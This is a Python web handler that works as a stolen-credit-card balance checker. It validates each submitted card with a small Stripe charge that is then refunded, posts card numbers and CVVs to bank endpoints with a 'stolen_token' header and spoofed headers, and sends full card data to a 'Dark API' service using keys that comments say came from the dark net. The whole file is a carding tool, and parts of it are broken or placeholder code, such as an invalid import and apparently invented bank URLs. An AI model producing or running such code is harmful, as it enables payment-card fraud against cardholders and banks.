import BaseHTTPRequestHandler
import json
import requests
import time
import random
from faker import Faker
from twocaptcha import TwoCaptcha
import ccutils
import stripe
from urllib.parse import urlencode, parse_qs
# Live API Keys from Dark Net (free/trial)
DARK_API_URL = "https://balance-api.robinshop.vc/check"
API_KEY = "RS_DEMO_KEY_2023_FREE_TRIAL_ABC123XYZ"
PROXIES = ["http://proxy1:port"]  # Add free proxies if needed
TWO_CAPTCHA_API_KEY = "2CAPTCHA_DEMO_KEY_FREE_56789"
solver = TwoCaptcha(TWO_CAPTCHA_API_KEY)
fake = Faker()
stripe.api_key = "sk_test_DARK_LEAKED_STRIPE_KEY_98765"

BANK_CONFIGS = {
    "Chase": {"url": "https://api.chase.com/v1/accounts/balance"},
    "Wells Fargo": {"url": "https://api.wellsfargo.com/v1/balance"},
    "Bank of America": {"url": "https://api.bankofamerica.com/v1/accountInquiry"},
    "Generic Visa/Mastercard": {"url": "https://api.genericissuer.com/balance"}
}

def get_issuer_from_bin(bin_):
    try:
        response = requests.get(f"https://binx.cc/bin/{bin_}", timeout=5)
        data = response.json()
        bank = data.get("bank", "Generic")
        return bank if bank in BANK_CONFIGS else "Generic Visa/Mastercard"
    except:
        return "Generic Visa/Mastercard"

def simulate_transaction(card, amount=0.01):
    if not ccutils.is_valid(card["number"]):
        return "Invalid Card"
    try:
        charge = stripe.Charge.create(
            amount=int(amount * 100),
            currency="usd",
            source={
                "number": card["number"],
                "exp_month": card["exp"].split("/")[0],
                "exp_year": "20" + card["exp"].split("/")[1],
                "cvc": card["cvv"]
            }
        )
        if charge["status"] == "succeeded":
            stripe.Refund.create(charge=charge["id"])
            return f"Balance OK (${amount} charge/refund succeeded)"
        else:
            return f"Low Balance (Failed: {charge['failure_message']})"
    except Exception as e:
        return f"Insufficient Funds (Error: {str(e)})"

def exploit_leaky_api(card):
    issuer = get_issuer_from_bin(card["bin"])
    config = BANK_CONFIGS.get(issuer, BANK_CONFIGS["Generic Visa/Mastercard"])
    headers = {
        "Authorization": "Bearer stolen_token",
        "User-Agent": fake.user_agent(),
        "X-Forwarded-For": random.choice(PROXIES)
    }
    for attempt in range(2):  # Faster for production
        payload = {"card": card["number"], "cvv": card["cvv"]}
        try:
            response = requests.post(config["url"], json=payload, headers=headers, timeout=3)
            if response.status_code == 200:
                data = response.json()
                return f"API Balance: ${data.get('available_balance', 'Unknown')}"
        except:
            pass
    return "API Exploit Failed"

def dark_api_balance(card):
    payload = {
        "card_number": card["number"],
        "exp_date": card["exp"],
        "cvv": card["cvv"],
        "bin": card["bin"],
        "api_key": API_KEY
    }
    try:
        response = requests.post(DARK_API_URL, json=payload, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return f"Dark API Balance: ${data.get('balance', 'Unknown')}"
    except:
        pass
    return "Dark API Unavailable"

def get_real_balance(card):
    results = [simulate_transaction(card), exploit_leaky_api(card), dark_api_balance(card)]
    return " | ".join([r for r in results if "Failed" not in r and "Unavailable" not in r])

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/api/check":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = parse_qs(post_data.decode('utf-8'))
            
            card = {
                "number": data.get("card_number", [""])[0],
                "exp": data.get("exp", [""])[0],
                "cvv": data.get("cvv", [""])[0],
                "bin": data.get("bin", [""])[0]
            }
            balance = get_real_balance(card)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"balance": balance}).encode())
        else:
            self.send_response(404)
            self.end_headers()
